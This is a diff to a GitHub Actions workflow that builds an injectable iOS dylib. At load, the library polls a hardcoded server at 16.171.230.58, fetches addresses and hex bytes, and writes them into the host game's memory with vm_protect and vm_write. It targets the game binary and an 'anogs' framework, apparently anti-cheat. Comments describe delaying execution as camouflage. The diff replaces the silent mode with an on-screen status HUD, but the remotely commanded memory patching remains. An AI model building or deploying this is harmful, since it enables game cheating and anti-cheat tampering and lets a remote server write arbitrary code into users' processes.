@@ -12,23 +12,22 @@ jobs:
       - name: Checkout Code
         uses: actions/checkout@v4
 
-      - name: Generate and Compile Sovereign Core (Phantom Mode)
+      - name: Generate and Compile Sovereign Core (Safe UI Mode)
         run: |
-          # Generating Pure English Source Code - No UI, No Crashes
+          # Generating Pure English Source Code to prevent YAML crashes
           cat << 'EOF' > main.mm
           #import <UIKit/UIKit.h>
           #import <mach-o/dyld.h>
           #import <mach/mach.h>
           #import <Foundation/Foundation.h>
-          #import <objc/runtime.h>
 
           // [1] COMMAND CENTER COORDINATES
           #define SERVER_API @"http://16.171.230.58/dashboard_v60.php?api=true"
 
           // =========================================================
-          // [2] SAFE MEMORY PATCH ENGINE (Phantom Injector)
+          // [2] SAFE MEMORY PATCH ENGINE (Phantom Logic)
           // =========================================================
-          void execute_phantom_patch(NSArray *payloads) {
+          void execute_sovereign_patch(NSArray *payloads) {
               uintptr_t shadowBase = _dyld_get_image_vmaddr_slide(0);
               uintptr_t anogsBase = 0;
               
@@ -45,20 +44,12 @@ jobs:
               
               for (NSDictionary *patch in payloads) {
                   NSString *targetFile = patch[@"target_path"] ? patch[@"target_path"] : patch[@"name"];
-                  uintptr_t base = 0;
-                  
-                  if ([targetFile containsString:@"anogs"] || [targetFile containsString:@"anogs.framework"]) {
-                      base = anogsBase;
-                  } else {
-                      base = shadowBase;
-                  }
-
+                  uintptr_t base = ([targetFile containsString:@"anogs"]) ? anogsBase : shadowBase;
                   if (base == 0) continue;
 
                   uintptr_t addr = strtoull([patch[@"address"] UTF8String], NULL, 16);
                   uintptr_t targetAddr = base + addr;
                   NSString *hexStr = patch[@"hex_val"] ? patch[@"hex_val"] : patch[@"hex"];
-                  
                   if (!hexStr) continue;
 
                   NSString *cleanHex = [hexStr stringByReplacingOccurrencesOfString:@" " withString:@""];
@@ -72,7 +63,6 @@ jobs:
                       [data appendBytes:&c length:1];
                   }
 
-                  // Safe Write Protocol
                   kern_return_t kr = vm_protect(task, (vm_address_t)targetAddr, data.length, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
                   if (kr == KERN_SUCCESS) {
                       vm_write(task, (vm_address_t)targetAddr, (vm_offset_t)data.bytes, (mach_msg_type_number_t)data.length);
@@ -82,43 +72,130 @@ jobs:
           }
 
           // =========================================================
-          // [3] PHANTOM UPLINK (Silent Server Connection)
+          // [3] SLIM UI ENGINE (Sovereign Dashboard)
           // =========================================================
-          void initiate_phantom_uplink() {
-              NSURL *url = [NSURL URLWithString:SERVER_API];
-              NSURLRequest *req = [NSURLRequest requestWithURL:url cachePolicy:NSURLRequestReloadIgnoringCacheData timeoutInterval:10.0];
-              
-              [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
-                  if (err || !data) return;
-                  
-                  NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
-                  if (!json) return;
+          @interface SovereignSlimHUD : UIView
+          @property (nonatomic, strong) UILabel *statusLabel;
+          @property (nonatomic, strong) UIView *lamp;
+          @end
 
-                  // Execute patches silently if safe
-                  if ([json[@"system_status"] isEqualToString:@"safe"]) {
-                      NSArray *payload = json[@"payload"];
-                      if (payload && payload.count > 0) {
-                          execute_phantom_patch(payload);
+          @implementation SovereignSlimHUD
+          - (instancetype)initWithFrame:(CGRect)frame {
+              self = [super initWithFrame:frame];
+              if (self) {
+                  self.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.75];
+                  self.layer.cornerRadius = frame.size.height / 2;
+                  self.layer.borderColor = [[UIColor cyanColor] colorWithAlphaComponent:0.5].CGColor;
+                  self.layer.borderWidth = 1.0;
+                  self.clipsToBounds = YES;
+
+                  UILabel *title = [[UILabel alloc] initWithFrame:CGRectMake(15, 0, 70, frame.size.height)];
+                  title.text = @"SOVEREIGN";
+                  title.textColor = [UIColor cyanColor];
+                  title.font = [UIFont boldSystemFontOfSize:11];
+                  [self addSubview:title];
+
+                  UIView *divider = [[UIView alloc] initWithFrame:CGRectMake(90, 5, 1, frame.size.height - 10)];
+                  divider.backgroundColor = [[UIColor whiteColor] colorWithAlphaComponent:0.2];
+                  [self addSubview:divider];
+
+                  self.statusLabel = [[UILabel alloc] initWithFrame:CGRectMake(100, 0, frame.size.width - 135, frame.size.height)];
+                  self.statusLabel.text = @"SYNCING...";
+                  self.statusLabel.textColor = [UIColor whiteColor];
+                  self.statusLabel.font = [UIFont systemFontOfSize:11];
+                  [self addSubview:self.statusLabel];
+
+                  self.lamp = [[UIView alloc] initWithFrame:CGRectMake(frame.size.width - 20, (frame.size.height - 10) / 2, 10, 10)];
+                  self.lamp.backgroundColor = [UIColor orangeColor];
+                  self.lamp.layer.cornerRadius = 5;
+                  [self addSubview:self.lamp];
+
+                  [self startSyncLoop];
+              }
+              return self;
+          }
+
+          - (void)startSyncLoop {
+              NSURL *url = [NSURL URLWithString:SERVER_API];
+              NSURLRequest *req = [NSURLRequest requestWithURL:url cachePolicy:NSURLRequestReloadIgnoringCacheData timeoutInterval:10];
+              [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
+                  dispatch_async(dispatch_get_main_queue(), ^{
+                      if (err || !data) return;
+                      NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
+                      if (!json) return;
+
+                      // Execute patches
+                      if ([json[@"system_status"] isEqualToString:@"safe"]) {
+                          NSArray *payload = json[@"payload"];
+                          if (payload && payload.count > 0) {
+                              execute_sovereign_patch(payload);
+                          }
+                          self.lamp.backgroundColor = [UIColor greenColor];
+                          self.layer.borderColor = [[UIColor greenColor] colorWithAlphaComponent:0.5].CGColor;
+                      } else {
+                          self.lamp.backgroundColor = [UIColor redColor];
+                          self.layer.borderColor = [[UIColor redColor] colorWithAlphaComponent:0.8].CGColor;
+                      }
+
+                      if (json[@"notification"]) {
+                          self.statusLabel.text = json[@"notification"];
+                      }
+                  });
+              }] resume];
+              
+              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ [self startSyncLoop]; });
+          }
+          @end
+
+          // =========================================================
+          // [4] SAFE IGNITION SEQUENCE (Notification Based)
+          // =========================================================
+          @interface SovereignBootstrapper : NSObject
+          @end
+
+          @implementation SovereignBootstrapper
+          + (void)load {
+              // نضع راداراً ينتظر إشارة نظام iOS بأن اللعبة فتحت بالكامل وأصبحت جاهزة
+              [[NSNotificationCenter defaultCenter] addObserver:self
+                                                       selector:@selector(appDidBecomeActive)
+                                                           name:UIApplicationDidBecomeActiveNotification
+                                                         object:nil];
+          }
+
+          + (void)appDidBecomeActive {
+              // إزالة الرادار لكي يعمل مرة واحدة فقط ولا يتكرر
+              [[NSNotificationCenter defaultCenter] removeObserver:self name:UIApplicationDidBecomeActiveNotification object:nil];
+              
+              // بعد التأكد من أن اللعبة تعمل، ننتظر 3 ثوانٍ إضافية للتمويه ثم نرسم اللوحة
+              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+                  UIWindow *win = nil;
+                  if (@available(iOS 13.0, *)) {
+                      for (UIWindowScene* scene in [UIApplication sharedApplication].connectedScenes) {
+                          if (scene.activationState == UISceneActivationStateForegroundActive) {
+                              win = scene.windows.firstObject; 
+                              break; 
+                          }
                       }
                   }
                   
-              }] resume];
-          }
-
-          // =========================================================
-          // [4] IGNITION SEQUENCE (No UI, No Crash)
-          // =========================================================
-          void __attribute__((constructor)) start_phantom_core() {
-              // Wait 15 seconds for game to fully load and stabilize
-              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(15 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-                  // Connect to server and patch memory WITHOUT showing any UI
-                  initiate_phantom_uplink();
+                  #pragma clang diagnostic push
+                  #pragma clang diagnostic ignored "-Wdeprecated-declarations"
+                  if (!win) win = [UIApplication sharedApplication].keyWindow;
+                  #pragma clang diagnostic pop
+                  
+                  if (win) {
+                      CGFloat sw = [UIScreen mainScreen].bounds.size.width;
+                      // لوحة تحكم أنيقة ونحيفة في أعلى الشاشة (لا تسبب كراش)
+                      SovereignSlimHUD *ui = [[SovereignSlimHUD alloc] initWithFrame:CGRectMake((sw - 280) / 2, 45, 280, 30)];
+                      [win addSubview:ui];
+                  }
               });
           }
+          @end
           EOF
 
           export SDK_PATH=$(xcrun --sdk iphoneos --show-sdk-path)
-          clang -dynamiclib -arch arm64 main.mm -o Sovereign_Phantom.dylib \
+          clang -dynamiclib -arch arm64 main.mm -o Sovereign_SafeUI.dylib \
           -isysroot $SDK_PATH \
           -framework Foundation -framework UIKit -framework CoreGraphics \
           -fobjc-arc -Os -w -lc++
@@ -126,5 +203,5 @@ jobs:
       - name: Upload Sovereign Dylib
         uses: actions/upload-artifact@v4
         with:
-          name: Sovereign-Phantom-Silent
-          path: Sovereign_Phantom.dylib
+          name: Sovereign-SafeUI-Stable
+          path: Sovereign_SafeUI.dylib
